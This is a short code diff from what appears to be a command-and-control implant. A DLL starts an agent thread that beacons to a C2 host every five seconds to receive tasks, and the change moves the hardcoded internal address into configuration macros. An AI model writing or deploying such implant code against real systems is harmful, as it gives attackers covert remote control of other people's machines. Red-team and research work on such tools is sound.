@@ -2,6 +2,7 @@
 #include <thread>
 #include "Agent.h"
 #include "HTTPCommunicationModule.h"
+#include "AgentConfig.h"
 
 // Entry point for the agent logic, runs on a dedicated thread so DllMain
 // returns immediately and does not hold the loader lock.
@@ -14,7 +15,7 @@ static DWORD WINAPI AgentThread(LPVOID) {
 
     // Comms loop: beacons every 5 s, delivers results, receives new tasks.
     // Start() never returns under normal operation.
-    HTTPCommunicationModule comm("172.16.97.1", 8080, agent);
+    HTTPCommunicationModule comm(AGENT_C2_HOST, AGENT_C2_PORT, agent);
     comm.Config();
     comm.Start();
 
